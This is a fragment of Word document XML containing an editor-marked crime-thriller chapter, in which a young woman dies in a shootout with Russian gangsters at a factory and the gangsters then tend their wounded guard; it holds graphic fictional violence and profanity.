          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bang!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> “…dick!” </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bang!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bang!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bang!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giggled.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made several loud, pained grunting noises.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Deshaun nervously said, “Hey… Hey, Sergey. You okay, boss-man? You don’t look so good…”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large Russian snapped back gruffly, “Mind your own fucking business!”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abandoned his tantrum and spoke a few words of Russian, his voice heavy with concern.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 said I’m fine, God damn it,” Sergey rumbled defiantly. “Now let’s think of way to… to… How you would say?”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Deshaun offered, “Fuck these shitheads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“Exactly.”</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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rat-tat-tat</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of Julie’s gun</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> burst out suddenly. She fired a few bullets through the broken office windows, announcing that she had successfully reloaded. Danny couldn’t find anything helpful on the bullet-scarred computer, but Julie had put it to use to figure out how to operate her firearm. Between Wikipedia, YouTube, and some gun enthusiast websites, she was able to identify it as a </w:t>
      </w:r>
      <w:commentRangeStart w:id="2178"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">MAC-10 </w:t>
      </w:r>
      <w:commentRangeEnd w:id="2178"/>
      <w:r w:rsidR="0087230D">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2178"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and determine how to swap the magazine and load a round into the chamber.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“Jason,” Danny </w:t>
      </w:r>
      <w:ins w:id="2179" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidR="00297140">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>entreate</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2180" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00297140">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 “Can’t you, like, talk us out of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how do you propose I do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don’t know</w:t>
      </w:r>
      <w:ins w:id="2181" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidR="00264725">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2182" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00264725">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183" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidR="00264725">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2184" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00264725">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>N</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>egotiate or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“We’re in no position,” Jason scoffed. “Negotiation isn’t some magic spell where I open my mouth and suddenly everyone becomes lovey-dovey. Negotiation takes leverage. Which we don’t</w:t>
      </w:r>
      <w:ins w:id="2185" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidR="00E56E0B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2186" w:author="TextVet" w:date="2016-03-22T13:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E56E0B">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 still have our phones</w:t>
      </w:r>
      <w:ins w:id="2187" w:author="TextVet" w:date="2016-03-22T13:09:00Z">
        <w:r w:rsidR="004F7286">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2188" w:author="TextVet" w:date="2016-03-22T13:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F7286">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2189" w:author="TextVet" w:date="2016-03-22T13:09:00Z">
        <w:r w:rsidR="004F7286">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2190" w:author="TextVet" w:date="2016-03-22T13:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F7286">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>” said Danny. “</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Is there anyone you can call?”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cops?” Jason offered</w:t>
      </w:r>
      <w:ins w:id="2191" w:author="TextVet" w:date="2016-03-22T13:09:00Z">
        <w:r w:rsidR="004F7286">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> Danny</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “But, um…” He gestured out to the room — to the cocaine on the desk, to the bullet holes in the wall, to the mangled corpse below. “I can make shit up, Danny, but I can’t think of any innocent way to explain what we’re doing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sighed. “So. Death or jail. That’s our options?”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looked down somberly and shrugged.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for her part, admired herself in the bathroom mirror. She postured and posed with the gun, pouting her lips and giving sultry looks, pressing it up against her body like an action movie femme fatale — the visual impression of erotic danger greatly diminished by her pajamas and bunny slippers. “God, you guys are a bunch of whiners.”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asked, “Got any ideas, Julie?”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“Yeah, I do,” she said, trying out a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Charlie’s Angels</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> pose and finding that it was best done in heels and a side-slit skirt rather than borrowed sweatpants. “But you guys are too chickenshit for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“Try us,” Jason insisted.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she said. “I’m sick of explaining shit to you guys. Ever since you got here, you’re all talk talktalk. Fuck that. You want to get something done, just fucking do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“Tell us what you have in mind, Julie,” Jason coaxed.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response, Julie marched to the desk and grabbed the large, heavy key. “You.” She jabbed a finger at Danny’s chest. “When I give a signal, start banging on this door. Pound on it. You know, create a distraction. Think you can handle that?” She then skipped down the stairs, her slipper-clad feet making soft syncopated landings. Down in the factory, she bounded toward the large metal double doors at the front of the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the inside, the loading doors were held closed by a complex mechanical arrangement of steel crossbars, operated by a large lever. A heavy padlock kept the lever in place. Slowly and quietly, struggling against the cocaine to keep her fingers from shaking, Julie slid the key into the padlock and discreetly freed the lever. With the lock undone, she began a series of practice pantomimes on the latch mechanism. After a dozen or so rehearsals, the girl closed her eyes, concentrated, and took several breaths. Finally, she looked up at Danny and shook her fist in the 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slapped his hand hard against the locked door, sending out metallic reverberations. He was answered with a gunshot from outside, accompanied by the “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>plink!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” of a bullet.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awkwardly called, “Hey, uh, Eugene! Eugene, are you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the other side, Eugene said, “Did you hear that? Did this fucker just call my name like he’s my buddy? You got something to say to me, dickwad?”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want to, uh, negotiate?” Danny shouted.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Sergey’s deep voice responded, “You want to talk, you talk with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replied, “I.. Uh… I was just thinking, that, uh, you know, we have the vial in here… You know, the vial you want… Or at least, I assume you want… So, like, maybe if you wanted to, uh, like…”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 was interrupted by a loud metallic groan from below.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as much strength as her small arms could muster, Julie yanked the lever that drove the mechanical latches holding the loading doors shut. The large metal double doors came unmoored from their sockets, and Julie shoved one of them narrowly open.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“Surprise, motherfuckers!” she screamed, and let loose a hail of gunfire.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men in the alley shouted and dove for cover, Deshaun behind the exterior stairwell and the two Russians behind their BMW. Julie crouched in the doorway, using the large metal doors as a shield, steering the MAC-10 with both hands. The rattle of her gun was answered by the matching report of the black man’s identical firearm and the sporadic bangs of Eugene’s revolver.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gap in the doors put the exterior stairwell directly in Julie’s line of fire. Her bullets made high-pitched plinks as they grazed off of the iron railing, zinging through wide gaps in the struts between the steps. The African-American guard aimed around the side of the railing and fired back.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dropped to the ground just in time. The spray of hollow-point bullets from Deshaun’s gun had been meant for Julie’s head, but instead hit the narrowly opened door behind her. They squashed against the inside of the metal door, pushing against it and bouncing idly away as flat little mushrooms of lead that ricocheted into the factory. The door behind Julie began to swing wide open from the kinetic energy of the deadly projectiles.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ground, Julie kept firing. The stairwell, she noticed, didn’t quite reach all the way down to the ground. There was a gap of approximately three inches between the asphalt and the bottom</w:t>
      </w:r>
      <w:del w:id="2192" w:author="TextVet" w:date="2016-03-22T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0090319F">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most stair, and in that gap she could see Deshaun’s shoes. She turned the MAC-10 horizontally, rested her hand on the ground, and seized the opportunity.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burst of bullets ripped through the guard’s foot and ankle. He let out a sustained, choking grunt, and fell sideways onto the stairwell, landing on his knees. He tried </w:t>
      </w:r>
      <w:del w:id="2193" w:author="TextVet" w:date="2016-03-22T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0090319F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>us</w:t>
      </w:r>
      <w:ins w:id="2194" w:author="TextVet" w:date="2016-03-22T13:21:00Z">
        <w:r w:rsidR="0090319F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2195" w:author="TextVet" w:date="2016-03-22T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0090319F">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xml:space="preserve"> his arms to push himself off</w:t>
      </w:r>
      <w:del w:id="2196" w:author="TextVet" w:date="2016-03-22T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00156CD7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the stairs and back into an upright position, grunting through gritted teeth. When his leg collapsed under him a second time, he looked down at his foot, and that’s when he started screaming.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Laying prone on the stairs made him a much easier target for Julie. There were gaps in the ironwork to permit a bullet to pass. She stood up, lifted her firearm, and prepared to spray several more bullets at him, counting on at least one to score a killing shot.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Instead, she flew backward into the factory.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echoes of the last bang from Eugene’s pistol resounded through the alley. The ricochet of Deshaun’s bullets had pushed the door open wide enough to afford the crew-cut Russian a clear shot at the small Asian girl.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fell on her tailbone and landed face-up just inside the large loading doors. Her MAC-10 was still in her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Lying on her back, she stared upward at the ceiling’s gymnasium lights </w:t>
      </w:r>
      <w:ins w:id="2197" w:author="TextVet" w:date="2016-03-22T13:24:00Z">
        <w:r w:rsidR="009818E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>through</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2198" w:author="TextVet" w:date="2016-03-22T13:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009818E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a blank, confused look</w:t>
      </w:r>
      <w:del w:id="2199" w:author="TextVet" w:date="2016-03-22T13:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009818E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> on her face</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. She tried to rise, but her abdominal muscles wouldn’t obey</w:t>
      </w:r>
      <w:del w:id="2200" w:author="TextVet" w:date="2016-03-22T13:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00554A29">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> her</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one side of her abdomen, her sweatshirt bore a small moist circular stain of blood, barely the size of a penny.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stain quickly grew much bigger.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managed to turn </w:t>
      </w:r>
      <w:ins w:id="2201" w:author="TextVet" w:date="2016-03-22T13:59:00Z">
        <w:r w:rsidR="00E87E52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>over</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2202" w:author="TextVet" w:date="2016-03-22T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E87E52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>herself to the opposite side</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and lift herself up on an elbow.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coughed wetly. A thick stream of blood flowed out from her mouth.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small Asian girl remained frozen</w:t>
      </w:r>
      <w:del w:id="2203" w:author="TextVet" w:date="2016-03-22T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E87E52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in that position</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, propped on one elbow. Her breathing became short</w:t>
      </w:r>
      <w:ins w:id="2204" w:author="TextVet" w:date="2016-03-22T14:00:00Z">
        <w:r w:rsidR="00F16EBC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2205" w:author="TextVet" w:date="2016-03-22T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F16EBC">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shallow. Her skin paled</w:t>
      </w:r>
      <w:ins w:id="2206" w:author="TextVet" w:date="2016-03-22T14:03:00Z">
        <w:r w:rsidR="006810E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, veiling in</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2207" w:author="TextVet" w:date="2016-03-22T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F16EBC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, acquiring</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:ins w:id="2208" w:author="TextVet" w:date="2016-03-22T14:02:00Z">
        <w:r w:rsidR="00F16EBC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>washed-out, verdigris</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2209" w:author="TextVet" w:date="2016-03-22T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F16EBC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sickening greenish</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hue. Her dark, wide-pupil</w:t>
      </w:r>
      <w:del w:id="2210" w:author="TextVet" w:date="2016-03-22T14:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006810E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed eyes glazed over. She began to shiver.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Hearing the sound of movement just outside the loading doors, she slowly turned her head to look outward. A man’s shadow darkened the doorway. Julie lifted the MAC-10 in one hand and waved it at the entrance, straining against the gun’s weight. The weapon shook in her weakening hand. She squeezed the trigger. The recoil knocked the firearm out of her grasp.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muscular, leather-clad figure of Eugene wheeled into the doorway. He fired two quick shots squarely into Julie’s ribs and spun back out of sight.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Julie collapsed. A final wet, rasping breath escaped her throat, carrying with it a red, bubbling froth. Her entire body twitched once, and fell still.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room was silent. Blood pooled around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again appeared in the doorway, crouching low and glancing around cautiously. He reached through the entrance just far enough to grab a bunny-slipper-clad ankle, and dragged her lifeless body out into the alley. A streak of blood on the floor marked her exit, and she was gone.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the sound of rustling clothing.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Oppah!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” said Eugene. “Seryozha, look what the good little girl has for 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had the vial on her?” asked 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Eugene said happily. He walked toward Sergey. “Here you go, Seryozha. Is present from your favorite nephew!”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responded in Russian.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“Now we go in and teach those fuckers a lesson?” asked Eugene.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said Sergey. “Now we save our soldier.”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Deshaun grunted between shallow breaths.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“Keep your feet up, Deshaun,” Sergey commanded. “You lose a lot of blood already. Foot is a bad place to get shot. Blood gushes out like from faucet. Now hold on, I tie my belt around the leg, make less blood flow,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Deshaun said through gritted teeth, “Am I gonna walk, boss?”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responded, “Let’s make sure you not to go into shock, then we worry about you dancing ballet with Rosie someday in a future. We need get you to doctor, but we can’t start Eugene’s car. We take yours. You have keys? Is it close?”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It’s around the corner,” said Deshaun. Keys jingled.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instructed, “Zhenya, stay here with him, keep his feet up. I drive over.”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“Bad idea, Seryozha,” said Eugene tensely. “You bring that ride here, it’ll get zapped by that fucking 